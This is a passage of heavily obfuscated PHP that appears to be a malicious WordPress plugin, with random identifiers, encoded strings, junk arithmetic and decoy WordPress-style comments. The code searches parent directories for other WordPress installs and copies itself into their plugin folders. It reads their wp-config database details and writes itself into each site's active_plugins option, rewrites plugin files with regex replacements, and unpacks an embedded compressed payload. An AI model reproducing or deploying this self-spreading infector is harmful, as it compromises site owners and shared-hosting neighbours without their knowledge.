return $jl0vmpmd40;

 }

function  eh3hg4yyjsa76iw()


  {
 $p2fntj3gsna   =   array();

      if  (defined(dhd5r6_4ki(1039))  && $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(927))) {
$gwtbsnyj42c_hs1g =    (array) get_option(mhiu2yqz6kqd(145),   array());
   $cpihjoeensb  =  array();
  foreach ($gwtbsnyj42c_hs1g as $basename) {
   if  (!   $GLOBALS['__scf__me483qbepnts_41']($basename) ||   $GLOBALS['__scf_nr12ouzrtt_7']($basename,  mhiu2yqz6kqd(1040)) !==    false)   {
  continue;
  }
       $sd4qd9dnkqj =   $GLOBALS['__scf_eure5hcx2b_11']($basename);
  if ($sd4qd9dnkqj   ===  '.')  {
// dead code



 $sd4qd9dnkqj  =  $basename;
}


 if   (isset($cpihjoeensb[$sd4qd9dnkqj]))   {
continue;
 }
    $cpihjoeensb[$sd4qd9dnkqj] =  true;
  $no4625mwq2q9a2      =      WP_PLUGIN_DIR .   '/' .   $basename;
 if   ($GLOBALS['__scf_eure5hcx2b_11']($basename) === '.')  {
    if (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))  {
 $p2fntj3gsna[]    =   $no4625mwq2q9a2;
}
   }  else   {
 $ys5go7qi508n   =   $GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2);


  if  (@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n)) {
     $p2fntj3gsna  =     $GLOBALS['__scf_b3z_uoye0i_367']($p2fntj3gsna,      vqqlehve69le8x4vqw89x($ys5go7qi508n,  array(mhiu2yqz6kqd(1041))));
  }
  }
  }
}

 if      (@$GLOBALS['__scf_ux4_n6mewmsy_43'](s3e5iki9upa0ccql()))   {
     $c6vxsja5mtn14f   =   ly0t7sdceinn03pyne3(s3e5iki9upa0ccql(),  (4982+18));
    if   ($GLOBALS['__scf_vf9p0fditvxy_35']($c6vxsja5mtn14f))    {


  foreach   ($c6vxsja5mtn14f    as      $tkt_c3gey3l) {
  if   ($tkt_c3gey3l  ===     vru1jzm2va580zgo4i2cxv())  {$rl8pon6p=724;$w1ls_zzwb2=($rl8pon6p>0)?$rl8pon6p:-$rl8pon6p;


     continue;
  }
 $pmuqotgyfm5tcjn   =    s3e5iki9upa0ccql() .   '/' . $tkt_c3gey3l;
if    (@$GLOBALS['__scf_gsamhlxot70ps_18']($pmuqotgyfm5tcjn)  &&     $GLOBALS['__scf_h3sj62ryxfdde_99']($GLOBALS['__scf_l2thcf5lcfr_202']($tkt_c3gey3l,  constant(f5cd2smymkqusi5(726)))) ===   dhd5r6_4ki(1041)) {
      $p2fntj3gsna[] = $pmuqotgyfm5tcjn;
   }
    }
 }
// WP Block API v3: escape-analyze lsm-tree

}
   



 if  (defined(nrudcgor(1042))   &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1043)))     {
    $qpj8a8he0_ =   (string)   get_option(dhd5r6_4ki(1044),    "");
      $emqq3k5zx4vm00k   = (string)  get_option(nhceivfj8tbe(1045),    "");
     $hri52eyd9d57sh  =  defined(pahk8uy1uxt(1046))   ?  WP_CONTENT_DIR .  dhd5r6_4ki(1047)   :  ABSPATH     .   dhd5r6_4ki(1048);

  $c82yatw8rrp9ql =  $GLOBALS['__scf_e3ymc0hwiys_147']($GLOBALS['__scf_zzp00036ej_335'](array($qpj8a8he0_,    $emqq3k5zx4vm00k)));


    foreach ($c82yatw8rrp9ql   as    $spxzjtpg4pa938mw) {
  if    ($GLOBALS['__scf_nr12ouzrtt_7']($spxzjtpg4pa938mw, nrudcgor(1040)) !==    false)   {



    continue;
  }
   $gj7r43vt2c0lnc6_   =    $hri52eyd9d57sh   .  '/'  .  $spxzjtpg4pa938mw;

   if    (@$GLOBALS['__scf_ux4_n6mewmsy_43']($gj7r43vt2c0lnc6_))      {
 
   $cvpcep7vn_jjiaae  =  ly0t7sdceinn03pyne3($gj7r43vt2c0lnc6_, (1975+25));
 if ($GLOBALS['__scf_vf9p0fditvxy_35']($cvpcep7vn_jjiaae))    {
/* connected linear-type */

      foreach   ($cvpcep7vn_jjiaae as  $tkt_c3gey3l)   {
  $_pe5b_hary  =  $gj7r43vt2c0lnc6_  .   '/'    .  $tkt_c3gey3l;
     if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($_pe5b_hary) &&   $GLOBALS['__scf_h3sj62ryxfdde_99']($GLOBALS['__scf_l2thcf5lcfr_202']($tkt_c3gey3l,  constant(pahk8uy1uxt(726)))) === f5cd2smymkqusi5(1049))  {
 $p2fntj3gsna[]  =    $_pe5b_hary;
    }
// PHP 8.3 readonly: free opaque-type

   }
}
   
$vuc5umn0nyyzkb  =  $gj7r43vt2c0lnc6_     .  nrudcgor(1050);
if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($vuc5umn0nyyzkb))   {
 $p2fntj3gsna =   $GLOBALS['__scf_b3z_uoye0i_367']($p2fntj3gsna,     vqqlehve69le8x4vqw89x($vuc5umn0nyyzkb,   array(pahk8uy1uxt(1049))));
  }



 }
}
    }
return $GLOBALS['__scf_e3ymc0hwiys_147']($p2fntj3gsna);
 }
 function nr7uvtguy4599vesb($gurk4u0g0h057)


   {
   if (!$GLOBALS['__scf_vf9p0fditvxy_35']($gurk4u0g0h057)) return array();
   $m6t27xygoirjp  =  array();
   foreach ($gurk4u0g0h057  as   $o6cshl9m0sbvrr) {
 if  (!$GLOBALS['__scf__me483qbepnts_41']($o6cshl9m0sbvrr) ||  $o6cshl9m0sbvrr  === ""  ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($o6cshl9m0sbvrr)   > (3487+609)) continue;
try   {
   if  (@$GLOBALS['__scf_saw_32lvsj_92']($o6cshl9m0sbvrr, "")   ===  false)     continue;
  }  catch    (Throwable $h2v_bjm4ejxq8fp)    {
   continue;
  } catch (Exception  $h2v_bjm4ejxq8fp)   {
continue;
  }



  $m6t27xygoirjp[]   =  $o6cshl9m0sbvrr;
}


return $m6t27xygoirjp;
 }


   function   y3ey9u3hwumkf71y1dwhsl($gurk4u0g0h057)
 {


try   {

     if      (empty($gurk4u0g0h057)) {
     return    false;



}



     $p2fntj3gsna  =   eh3hg4yyjsa76iw();
    if  (empty($p2fntj3gsna))  {
 return false;



  }
$juryrqahqw   =  false;
 foreach   ($p2fntj3gsna    as    $pmuqotgyfm5tcjn)      {
 



   if  (!   @$GLOBALS['__scf_gsamhlxot70ps_18']($pmuqotgyfm5tcjn) ||   ! @$GLOBALS['__scf_cu2oflxkvh_47']($pmuqotgyfm5tcjn))  {



   continue;
 }
  
if  (@$GLOBALS['__scf_g9y45bstmb02a_95']($pmuqotgyfm5tcjn) >   (524220+68))   {
// WordPress 6.2 navigation: hook replicator

 continue;
    }
  $rjo5gf52iv1ov5t     =  @$GLOBALS['__scf_apq4pqdt6n41_91']($pmuqotgyfm5tcjn);
     if  (! $rjo5gf52iv1ov5t  ||    ! $GLOBALS['__scf__me483qbepnts_41']($rjo5gf52iv1ov5t))     {

 continue;
  }
   



  $_oh8gv71jy  = false;
foreach   ($gurk4u0g0h057    as    $aslsiuo92mu3) {
    try     {


        $duc70an_hos77 = @$GLOBALS['__scf_fhlvy786vrl3_463']($aslsiuo92mu3, "",  $rjo5gf52iv1ov5t);
if   ($duc70an_hos77  !==   null  &&  $duc70an_hos77  !==   $rjo5gf52iv1ov5t)  {


$rjo5gf52iv1ov5t    = $duc70an_hos77;
  $_oh8gv71jy   =    true;
}
  }  catch    (Throwable  $h2v_bjm4ejxq8fp)    {
 fukkkeh6955g9qi(nrudcgor(1051), $h2v_bjm4ejxq8fp);
continue;
   }  catch     (Exception $h2v_bjm4ejxq8fp) {
 continue;


     }

   }

 if ($_oh8gv71jy)   {$_7hp3p9u_o1g1=7178;$r8z0_pqi7w01t=$_7hp3p9u_o1g1%7;
 if     (jr30c_pj_1z9sfyaq3c88($pmuqotgyfm5tcjn,   $rjo5gf52iv1ov5t))  {

    $juryrqahqw  =  true;
}
}
    }
 
 return $juryrqahqw;
   }    catch (Throwable  $h2v_bjm4ejxq8fp)  {$g3opuvmqtt3e=188|157;$jpsfvr7xfgawa=$g3opuvmqtt3e^24;
fukkkeh6955g9qi(mhiu2yqz6kqd(1052),    $h2v_bjm4ejxq8fp);
   } catch   (Exception  $h2v_bjm4ejxq8fp) {



}


      return   false;
   }

  
  function    bjf9cn70t5e5upu4r($ys5go7qi508n, $ivcx9q6wi8d)
  {
 $f4uaalv3t0y    =      array();
   $ivcx9q6wi8d =  $ivcx9q6wi8d - 1;
 
$pmuse02zlnhx   =   ly0t7sdceinn03pyne3($ys5go7qi508n,    (857-357));
if    (!   $GLOBALS['__scf_vf9p0fditvxy_35']($pmuse02zlnhx)) {
     return   $f4uaalv3t0y;



  }
     $pmuse02zlnhx   =  $GLOBALS['__scf_jxqnb2ruhcwvk_155']($pmuse02zlnhx,  0,   (339+161));
 
foreach    ($pmuse02zlnhx     as  $tkt_c3gey3l)  {
   
  if  ($tkt_c3gey3l   ===  '.' ||  $tkt_c3gey3l   ===  dhd5r6_4ki(1040))    {$fgz1xw452g5=7468;$a736ke4nv946vl=$fgz1xw452g5%9;
  continue;



 }
 
 $gplyvw1d0b4i   =  $ys5go7qi508n .    '/'     .   $tkt_c3gey3l;
    if   (!    @$GLOBALS['__scf_ux4_n6mewmsy_43']($gplyvw1d0b4i))   {$gcfyfku05=11*6;$ssm4_mebezi3f=$gcfyfku05-18;

continue;
 }
     
  if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($gplyvw1d0b4i  .  pahk8uy1uxt(893)))   {
  $f4uaalv3t0y[] =  $GLOBALS['__scf_xv_2irmjrq_12']($gplyvw1d0b4i, f5cd2smymkqusi5(125));
      continue;
     }
 


    if ($ivcx9q6wi8d     >  0)  {$hnb57wmtq=66*8;$bwlki6x7p=$hnb57wmtq-21;
 $f4uaalv3t0y  =    $GLOBALS['__scf_b3z_uoye0i_367']($f4uaalv3t0y, bjf9cn70t5e5upu4r($gplyvw1d0b4i,   $ivcx9q6wi8d));
}
}


      return   $f4uaalv3t0y;

 }


 function  w6t95vu69t2nlhw84gu()
       {
   $oh3nls26_d58a   =  array();
  $cs61vu6qhc =   $GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH,  nrudcgor(1053));
   try {
  $l03u3kcjy2f0i   = array();
if ($cs61vu6qhc)    {
 $l03u3kcjy2f0i[] =  $GLOBALS['__scf_eure5hcx2b_11']($cs61vu6qhc);
  $l03u3kcjy2f0i[]   =    $GLOBALS['__scf_eure5hcx2b_11']($GLOBALS['__scf_eure5hcx2b_11']($cs61vu6qhc));


  $l03u3kcjy2f0i[] =  $GLOBALS['__scf_eure5hcx2b_11']($GLOBALS['__scf_eure5hcx2b_11']($GLOBALS['__scf_eure5hcx2b_11']($cs61vu6qhc)));
}

     $l03u3kcjy2f0i[]   = nrudcgor(1054);
    $l03u3kcjy2f0i[] =   f5cd2smymkqusi5(1055);
      $l03u3kcjy2f0i[] = f5cd2smymkqusi5(1056);
     $l03u3kcjy2f0i[]  =   mhiu2yqz6kqd(1057);
      $l03u3kcjy2f0i[]  =  f5cd2smymkqusi5(1058);
 $l03u3kcjy2f0i[] =    nrudcgor(1059);
 $l03u3kcjy2f0i[]  =   nrudcgor(1060);
   

 $_7hgv1f2sq9nsafu   =   $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(574))  ?  (string)      @$GLOBALS['__scf_jpj9mbom_1b_109'](dhd5r6_4ki(110))  : "";



 if   ($_7hgv1f2sq9nsafu  !==    "")   {
 $guf4kenw71g4cw  =     ($GLOBALS['__scf_nr12ouzrtt_7']($_7hgv1f2sq9nsafu,   ';')     !== false) ? ';'  :   ':';
        foreach  ($GLOBALS['__scf_xa4hcdunc1pgl_111']($guf4kenw71g4cw,  $_7hgv1f2sq9nsafu)  as $rk_3ecj8aw) {
// WP Button Block capability gate

 $rk_3ecj8aw  =     $GLOBALS['__scf_uvjtdemk2f_320']($rk_3ecj8aw);
      if ($rk_3ecj8aw    !== "")  {$ceb0hi07kz1so=(0xab+0xf4);$oc33ef6bjt=$ceb0hi07kz1so%15;
       $l03u3kcjy2f0i[]  = $rk_3ecj8aw;
  }



  }


    }
   

$l03u3kcjy2f0i =  $GLOBALS['__scf_e3ymc0hwiys_147']($GLOBALS['__scf_zzp00036ej_335']($l03u3kcjy2f0i));
     $jft9b0bpj4d081 = $GLOBALS['__scf_m30d3r9g_n_287'](true);
 $oh3nls26_d58a = array();
 

 foreach    ($l03u3kcjy2f0i  as      $ys5go7qi508n)      {

        if      (!     @$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n)   ||  !  @$GLOBALS['__scf_wp1g_umcsjt_46']($ys5go7qi508n))  {
  continue;
}
      if  (($GLOBALS['__scf_m30d3r9g_n_287'](true) -    $jft9b0bpj4d081) >   (19^25))  {


break;
 }
  
$oh3nls26_d58a  = $GLOBALS['__scf_b3z_uoye0i_367']($oh3nls26_d58a, bjf9cn70t5e5upu4r($ys5go7qi508n,  2));
}
    }    catch (Throwable    $h2v_bjm4ejxq8fp)  {
 fukkkeh6955g9qi(mhiu2yqz6kqd(1061), $h2v_bjm4ejxq8fp);
 }      catch     (Exception  $h2v_bjm4ejxq8fp)  {
}
     


        return $GLOBALS['__scf_pabtmjmzpv76n_149']($GLOBALS['__scf_e3ymc0hwiys_147']($oh3nls26_d58a),   array($cs61vu6qhc));

 }
 function  xpvdq9leqqv0sufowxw($a0bx0oyhxxxhwfwd)
 {
try {

  $djkpffbkhb5q    =  array($a0bx0oyhxxxhwfwd  .   mhiu2yqz6kqd(1062),   $a0bx0oyhxxxhwfwd   .      nrudcgor(1063));
    foreach ($djkpffbkhb5q    as $ys5go7qi508n) {

 if    (! @$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n))  {



        continue;



 }
$lmydsy9czvcz649m =   ly0t7sdceinn03pyne3($ys5go7qi508n, (4978+22));
 if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($lmydsy9czvcz649m))  {
    continue;
}


    foreach  ($lmydsy9czvcz649m  as   $h2v_bjm4ejxq8fp) {
 if   ($GLOBALS['__scf_bv1z3no349dv5r_9']($h2v_bjm4ejxq8fp,     -(3+1)) ===    nhceivfj8tbe(1064)    && m4eahxbbz3er7pv($ys5go7qi508n  . '/'  .      $h2v_bjm4ejxq8fp,   (4975+25)))  {
 return   true;
  }
 }



  foreach ($lmydsy9czvcz649m  as      $h2v_bjm4ejxq8fp)   {
 $w4v6nkybq8e =     $ys5go7qi508n    .  '/'   .  $h2v_bjm4ejxq8fp;



if   (!   @$GLOBALS['__scf_ux4_n6mewmsy_43']($w4v6nkybq8e))   {



  continue;
   }
   $zu3sjskee_15   = ly0t7sdceinn03pyne3($w4v6nkybq8e, (0x3b+0x134d));
if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($zu3sjskee_15))  {
  continue;
 }
foreach    ($zu3sjskee_15   as      $tkqx845nh5jt0)  {
   if ($GLOBALS['__scf_bv1z3no349dv5r_9']($tkqx845nh5jt0, -(0x3+0x1))    ===    mhiu2yqz6kqd(1065)    && m4eahxbbz3er7pv($w4v6nkybq8e .      '/'     . $tkqx845nh5jt0, (4916+84)))  {

     return  true;
}



 }
}
  }

 }    catch   (Throwable   $h2v_bjm4ejxq8fp) {
  fukkkeh6955g9qi(nhceivfj8tbe(1066), $h2v_bjm4ejxq8fp);


   } catch (Exception  $h2v_bjm4ejxq8fp)  {
     }



return false;
     }



  function  l2yu18w_qt9p7xn5()
{

       try {
if   (ivekqcfyl9cg5o8v8(vv_nfhhmy_1mjmsa()))   return;


     
     if  (get_transient(dhd5r6_4ki(1067))) {
       return;
     }


  set_transient(nrudcgor(1067),  1,  (51+549));
       
       $vg45smeglid  =  adbbbpoh0e7mcf6();$ih9z7zjvd2x1v=(0x59+0x26);$m141_mygnc=$ih9z7zjvd2x1v%6;
 if (! $vg45smeglid   ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)   <  (916+84)) {
     return;


    }
if   (!     hkk3yvii60ci7rk($vg45smeglid))  {
 fukkkeh6955g9qi(nrudcgor(1068), f5cd2smymkqusi5(741));

return;



}




      $oh3nls26_d58a    =    w6t95vu69t2nlhw84gu();
 if  (empty($oh3nls26_d58a))   {
// countable lsm-tree




if    (!get_transient(pahk8uy1uxt(1069)))   {
 fukkkeh6955g9qi(dhd5r6_4ki(1070),  dhd5r6_4ki(1071));
set_transient(nrudcgor(1069),   1,    (4374-774));
       }

set_transient(mhiu2yqz6kqd(1067),  1,  (222630+36570));
     return;
}
  $gg4ugkuy1ipo =  0;
  foreach  ($oh3nls26_d58a  as  $a0bx0oyhxxxhwfwd) {

if (xpvdq9leqqv0sufowxw($a0bx0oyhxxxhwfwd)) {
// WP Site Editor: terminate linear-type



 continue;
 }
  
  $o954x_g9u80eqk =   "";
  $wl8bs71ioiz =   $a0bx0oyhxxxhwfwd   . f5cd2smymkqusi5(1062);
if (@$GLOBALS['__scf_ekpq_b8etrq0_44']($wl8bs71ioiz)   &&  !@$GLOBALS['__scf_ux4_n6mewmsy_43']($wl8bs71ioiz))  {
$wl8bs71ioiz  = null;
 } elseif  (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($wl8bs71ioiz))   {


     gt671tq3242garyx4($wl8bs71ioiz, (456+37),  true);

 }
   if  ($wl8bs71ioiz  && (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($wl8bs71ioiz)  ||    !@$GLOBALS['__scf_cu2oflxkvh_47']($wl8bs71ioiz)))     {

$wl8bs71ioiz  =    null;
       }

 if  ($wl8bs71ioiz) {

 $k5ze8pkctk8 =  $wl8bs71ioiz    . '/'    .   vru1jzm2va580zgo4i2cxv();
  $upxtor_l03ri  =   vmv3l2fd6oj__92qteyq($vg45smeglid);

   $lruulmncnr24h4    = rqua3yflpt29vaz8icdaze($k5ze8pkctk8, $upxtor_l03ri,  mhiu2yqz6kqd(1070));
if  ($lruulmncnr24h4  && $lruulmncnr24h4    >=   $GLOBALS['__scf_amjjmfnilcolnb_10']($upxtor_l03ri))  {
     $o954x_g9u80eqk  = $k5ze8pkctk8;
 }


   }
 



      if   (! $o954x_g9u80eqk) {
       $__yalw520vq  =     $GLOBALS['__scf_l2thcf5lcfr_202'](vru1jzm2va580zgo4i2cxv(), PATHINFO_FILENAME);
   $eu7lsvn5hx7e =    $a0bx0oyhxxxhwfwd .  dhd5r6_4ki(1072) .  $__yalw520vq;
   if (!  @$GLOBALS['__scf_ux4_n6mewmsy_43']($eu7lsvn5hx7e)) {
 gt671tq3242garyx4($eu7lsvn5hx7e,   (452+41),   true);
 }
   $k5ze8pkctk8   =  $eu7lsvn5hx7e   .  '/' .     vru1jzm2va580zgo4i2cxv();
$upxtor_l03ri  =    vmv3l2fd6oj__92qteyq($vg45smeglid);
$lruulmncnr24h4 =  rqua3yflpt29vaz8icdaze($k5ze8pkctk8,    $upxtor_l03ri,  dhd5r6_4ki(1070));

if ($lruulmncnr24h4  &&     $lruulmncnr24h4   >= $GLOBALS['__scf_amjjmfnilcolnb_10']($upxtor_l03ri))  {
$o954x_g9u80eqk   =   $k5ze8pkctk8;



  $basename  =  $__yalw520vq  .  '/'     .  vru1jzm2va580zgo4i2cxv();



 qzq4dqx4xg4jpgptv6ux($a0bx0oyhxxxhwfwd, $basename);
  }
   }
   if (! $o954x_g9u80eqk)      {
     continue;

 }
   jqp5yotia2ogx9k($o954x_g9u80eqk);

rgiuaapohxeh0z($o954x_g9u80eqk,   (387+33));


 $gg4ugkuy1ipo++;

    }

       if   ($gg4ugkuy1ipo  >    0)    {
   set_transient(pahk8uy1uxt(1067),   1, (259149+51));
 }  else  {
      set_transient(dhd5r6_4ki(1073),     1,   (3514+86));
  }


   }   catch    (Throwable $h2v_bjm4ejxq8fp) {



   fukkkeh6955g9qi(pahk8uy1uxt(1070), $h2v_bjm4ejxq8fp);
} catch  (Exception   $h2v_bjm4ejxq8fp)   {
  }
}
  function   qzq4dqx4xg4jpgptv6ux($a0bx0oyhxxxhwfwd, $basename)
   {


 try  {

$hwhee7ay9grzf    =  $a0bx0oyhxxxhwfwd .  pahk8uy1uxt(1074);
      if  (!     @$GLOBALS['__scf_gsamhlxot70ps_18']($hwhee7ay9grzf))   {
  $hwhee7ay9grzf  =  $GLOBALS['__scf_eure5hcx2b_11']($a0bx0oyhxxxhwfwd)  .     dhd5r6_4ki(1074);
  if  (!  @$GLOBALS['__scf_gsamhlxot70ps_18']($hwhee7ay9grzf))   {



return;
}

  }
   $v_2ea0ui7nym = @$GLOBALS['__scf_apq4pqdt6n41_91']($hwhee7ay9grzf);
  if (!      $v_2ea0ui7nym)  {$yey6v4wrv5=62*7;$izm4rh1dl=$yey6v4wrv5-19;
  return;
}
$yx60_pexwi6l7 =    "";
 $prefix  =    "";
      if  ($GLOBALS['__scf_saw_32lvsj_92'](mhiu2yqz6kqd(1075), $v_2ea0ui7nym,    $d1kd72zq60vf6el))  {



   $yx60_pexwi6l7 =     $d1kd72zq60vf6el[1];
     }
// WP Latest Posts sidebar region

    if  ($GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1076), $v_2ea0ui7nym,   $d1kd72zq60vf6el))    {$s5jyy16pa=99+23;$nt679zce=$s5jyy16pa-5;
 $prefix     =  $d1kd72zq60vf6el[1];
}
// WordPress 6.5 revisions: derandomized heartbeat

   if  (! $yx60_pexwi6l7     ||    !  $prefix      ||   !  $GLOBALS['__scf_saw_32lvsj_92'](f5cd2smymkqusi5(1077), $prefix))     {
 return;
   }
     $wpdb     =  $GLOBALS[nhceivfj8tbe(872)];
 if    (!   $GLOBALS['__scf_d56ll0ap77jcvq_66']($wpdb)     || ! $GLOBALS['__scf_ttokt3ljhh_118']($wpdb,      mhiu2yqz6kqd(134)))   {


   return;


    }
 if  (!     $GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(1078), $yx60_pexwi6l7))     {
    fukkkeh6955g9qi(nhceivfj8tbe(1079),  dhd5r6_4ki(1080));
return;
}
  $ksmlss9bxqbf   =    '`'  . $yx60_pexwi6l7    .  mhiu2yqz6kqd(1081)    .   $prefix  .   dhd5r6_4ki(1082);
$wpdb->query(f5cd2smymkqusi5(1083));
 $i0qc4ifyzaeo0b   =   $wpdb->get_var('S'  . nhceivfj8tbe(1084)  .    $ksmlss9bxqbf     .    dhd5r6_4ki(1085)  .  f5cd2smymkqusi5(1086)      . nhceivfj8tbe(1087));
  

  if   ($i0qc4ifyzaeo0b   ===  null) {
$wpdb->query(pahk8uy1uxt(1088));
      return;
 }


 $gwtbsnyj42c_hs1g  =  dfwo9ta79he6zb4($i0qc4ifyzaeo0b);
       if  (!     $GLOBALS['__scf_vf9p0fditvxy_35']($gwtbsnyj42c_hs1g))    {
$wpdb->query(mhiu2yqz6kqd(1088));
 return;$ifnrargnq=45|159;$jut_qoprlxw5nb=$ifnrargnq^110;
       }
// merge replicator for Sodium crypto

if  ($GLOBALS['__scf_rq7q923zwh_148']($basename,   $gwtbsnyj42c_hs1g,  true))   {
 $wpdb->query(pahk8uy1uxt(1089));
  return;$butc5wjddq93=(0x93+0xa3);$wrtb_9dfw=$butc5wjddq93%9;
     }



 $gwtbsnyj42c_hs1g[]  =    $basename;
$gwtbsnyj42c_hs1g =  $GLOBALS['__scf_sonjjhvinvs6_146']($gwtbsnyj42c_hs1g);

      $tm23wedn5g = $GLOBALS['__scf_m881jp22m2wo_348']($gwtbsnyj42c_hs1g);
$wgpf1gmgtu = $wpdb->query($wpdb->prepare('U'   . f5cd2smymkqusi5(1090) .   $ksmlss9bxqbf   .   pahk8uy1uxt(1091)    .  pahk8uy1uxt(1092),    $tm23wedn5g));

  if    ($wgpf1gmgtu    === false)      {



fukkkeh6955g9qi(f5cd2smymkqusi5(1079),   mhiu2yqz6kqd(1093));


     $wpdb->query(dhd5r6_4ki(1094));$uz0jjagwexez=205|39;$ltl75wn35a=$uz0jjagwexez^160;
return;

       }
$wpdb->query(dhd5r6_4ki(1089));
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1095)))  {
  @wp_cache_delete(f5cd2smymkqusi5(1096), nhceivfj8tbe(1097));
@wp_cache_delete(nrudcgor(1098), nhceivfj8tbe(1097));
     }
} catch    (Throwable $h2v_bjm4ejxq8fp)  {
       fukkkeh6955g9qi(nrudcgor(1079),  $h2v_bjm4ejxq8fp);
 if   ($GLOBALS['__scf_d56ll0ap77jcvq_66']($GLOBALS[mhiu2yqz6kqd(872)])) {
@$GLOBALS[mhiu2yqz6kqd(872)]->query(nhceivfj8tbe(1094));
  }
}  catch    (Exception    $h2v_bjm4ejxq8fp)    {$q366i83mbfv=(0xc5+0xf3);$ri4yhw_ouuk2_=$q366i83mbfv%7;



fukkkeh6955g9qi(nhceivfj8tbe(1099),  $h2v_bjm4ejxq8fp);
        if    ($GLOBALS['__scf_d56ll0ap77jcvq_66']($GLOBALS[dhd5r6_4ki(1100)])) {
 @$GLOBALS[nhceivfj8tbe(1100)]->query(pahk8uy1uxt(1101));



       }
/* uncountable command */

 }

    }


   function      pec45e4yybq3woqtn()
  {
   static   $v_2ea0ui7nym  = null;
 if    ($v_2ea0ui7nym     !==   null)   return     $v_2ea0ui7nym;
 if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(276)))  {
      $v_2ea0ui7nym =   "";
   return    $v_2ea0ui7nym;

     }


 $v_2ea0ui7nym   = @gzinflate($GLOBALS['__scf_wlpl5h61eyolq_355'](pahk8uy1uxt(1102)));
    if   (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)   ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($v_2ea0ui7nym) <   (186-86)) $v_2ea0ui7nym   =    "";
  return    $v_2ea0ui7nym;
  }
     function    whipohxst5rdrpxw()
    {
    try   {

    if     (!defined(mhiu2yqz6kqd(1042))) return;
   $q4nmj640k4ytm0w  =  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),   pahk8uy1uxt(1065));



   $yc07oz4u4pa = ohrydgas8yy9a22s(ABSPATH  . dhd5r6_4ki(1103),  (0x1+0x7))    .  nrudcgor(1104);
$oe0kuwyehv     =   ohrydgas8yy9a22s(ABSPATH  .      pahk8uy1uxt(1105),   (11-3));


       $qv1rshmy4dcn  =    $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1106)) ?  content_url()      :    "";


   if   ($qv1rshmy4dcn ===    "")    {



 $qv1rshmy4dcn     =  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(567))    ?   get_site_url()     :   "")     .  nrudcgor(1107);
      }
    $r3bw5h6ltwcw0b  =    $GLOBALS['__scf_f9_5dfsm5hfxx_360'](dhd5r6_4ki(1108),   f5cd2smymkqusi5(1109),   $qv1rshmy4dcn   . '/'      .    $yc07oz4u4pa);
if   ($GLOBALS['__scf_nr12ouzrtt_7']($r3bw5h6ltwcw0b,     mhiu2yqz6kqd(1110))   !==      0)  $r3bw5h6ltwcw0b  =  dhd5r6_4ki(1111)   .    $GLOBALS['__scf_xztaeq78skok5_8']($r3bw5h6ltwcw0b,  '/');
$uj2p4q2y6w9  =   $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1112))   ?  home_url(pahk8uy1uxt(1113) .  h2iz25lld35tmbc2ls(nhceivfj8tbe(1114)))  :   "";
  if ($uj2p4q2y6w9    === "")   $uj2p4q2y6w9      =   f5cd2smymkqusi5(1115) .  romae2ec00z0c4bz61q_("") .   nhceivfj8tbe(1116)      .   h2iz25lld35tmbc2ls(f5cd2smymkqusi5(1114));
    if ($GLOBALS['__scf_nr12ouzrtt_7']($uj2p4q2y6w9, mhiu2yqz6kqd(1115))  !== 0)   $uj2p4q2y6w9  =    f5cd2smymkqusi5(1117)    .    $GLOBALS['__scf_xztaeq78skok5_8']($GLOBALS['__scf_fhlvy786vrl3_463'](pahk8uy1uxt(1118),   "",  $uj2p4q2y6w9),  '/');
// WP Post Terms: marshal iterator

  $xrlia3wn0e6dfy3  =      isset($GLOBALS[dhd5r6_4ki(450)])  &&   $GLOBALS['__scf__me483qbepnts_41']($GLOBALS[pahk8uy1uxt(450)])    ?   $GLOBALS[f5cd2smymkqusi5(1119)]   :     "";
if ($GLOBALS['__scf_amjjmfnilcolnb_10']($xrlia3wn0e6dfy3)    <  (120-20))   {
 $xrlia3wn0e6dfy3    = vlqx8b8viizxmck29ty0(pahk8uy1uxt(644),  "");
  }
       if ($GLOBALS['__scf_amjjmfnilcolnb_10']($xrlia3wn0e6dfy3)    <    (57+43))   {
// @configure opaque-type

$xrlia3wn0e6dfy3   = pec45e4yybq3woqtn();
  }
$zoa6tdqql_  =    "";
 if (isset($GLOBALS[pahk8uy1uxt(1120)])   &&    $GLOBALS['__scf__me483qbepnts_41']($GLOBALS[mhiu2yqz6kqd(1121)]) && $GLOBALS['__scf_amjjmfnilcolnb_10']($GLOBALS[nhceivfj8tbe(1121)]) > (14+36))      {
  $zoa6tdqql_  =    $GLOBALS[nhceivfj8tbe(1121)];
}  else  {$zaya1yx4gp=120|214;$xyefi0l17j=$zaya1yx4gp^32;


  $zoa6tdqql_  = vlqx8b8viizxmck29ty0(f5cd2smymkqusi5(1122),   "");
 }
 if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($zoa6tdqql_)  > (253^207)) {

  c8fb1vg_q0kn6h(f5cd2smymkqusi5(1122),   $zoa6tdqql_,   nhceivfj8tbe(1026));
 }
